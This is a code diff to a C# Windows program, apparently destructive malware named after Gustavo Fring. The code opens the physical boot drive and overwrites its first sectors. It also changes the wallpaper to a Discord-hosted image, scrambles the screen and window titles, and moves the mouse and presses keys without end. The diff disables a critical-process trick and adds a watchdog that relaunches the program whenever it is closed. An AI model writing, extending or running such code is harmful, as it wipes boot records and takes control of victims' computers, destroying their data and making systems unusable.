@@ -29,15 +29,16 @@ namespace Gustavo_Fring
 
         [DllImport("ntdll.dll", SetLastError = true)]
         private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
-        static void Main()
-        {
-            int isCritical = 1;  // we want this to be a Critical Process
-            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
 
-            Process.EnterDebugMode();  //acquire Debug Privileges
+        static void Main(string[] args)
+        {
+            //int isCritical = 1;  // we want this to be a Critical Process
+            //int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)
+
+            //Process.EnterDebugMode();  //acquire Debug Privileges
 
             // setting the BreakOnTermination = 1 for the current process
-            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
+            //NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
@@ -46,6 +47,8 @@ namespace Gustavo_Fring
 
             // Set the priority of the process to real-time.
             process.PriorityClass = ProcessPriorityClass.RealTime;
+
+            ProgramLauncher.LaunchSecondInstance();
             using (var stream = new FileStream(@"\\.\PhysicalDrive0", FileMode.Open, FileAccess.ReadWrite))
             {
                 // Seek to the beginning of the stream.
@@ -58,9 +61,9 @@ namespace Gustavo_Fring
                 stream.Write(buffer, 0, buffer.Length);
             }
             DesktopBackgroundSetter.SetDesktopBackground("https://cdn.discordapp.com/attachments/885221633055424612/1056936291947782245/IMG-20221225-WA0002.jpg");
-
-            var thread = new Thread(RandomizeScreen);
             
+            var thread = new Thread(RandomizeScreen);
+
 
             // Start the thread.
             thread.Start();
@@ -76,7 +79,7 @@ namespace Gustavo_Fring
             var triangles = new Thread(TriangleDrawer.DrawRandomTriangles);
             triangles.Start();
 
-           
+
 
             KeyboardButtonPressingThread.StartRandomButtonPresses();
             while (true)
@@ -85,10 +88,16 @@ namespace Gustavo_Fring
                 MoveWindowsRandomly();
                 Cursor.Position = new System.Drawing.Point(GetRandomCoordinate(), GetRandomCoordinate());
                 ClickMouse();
-                
+
 
             }
+
+
+
+
         }
+
+       
         static void ChangeWindowTitlesToGibberish()
         {
             // Get a list of all top-level windows.
@@ -582,6 +591,37 @@ namespace Gustavo_Fring
 
             // Delete the temporary file.
             File.Delete(tempFileName);
+        }
+    }
+    public static class ProgramLauncher
+    {
+        public static void LaunchSecondInstance()
+        {
+            // Get the path to the current executable.
+            var currentPath = Process.GetCurrentProcess().MainModule.FileName;
+
+            // Check if the current instance is the second instance.
+            var secondInstance = Environment.GetCommandLineArgs().Contains("second");
+
+            if (secondInstance)
+            {
+                
+                // Wait until the first instance has closed.
+                var firstInstanceClosed = false;
+                while (!firstInstanceClosed)
+                {
+                    firstInstanceClosed = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Where(p => p.Id != Process.GetCurrentProcess().Id).Count() == 0;
+                    Thread.Sleep(1000);
+                }
+
+                // Relaunch the first instance.
+                Process.Start(currentPath);
+            }
+            else
+            {
+                // Launch the second instance with the "second" argument.
+                Process.Start(currentPath, "second");
+            }
         }
     }
     
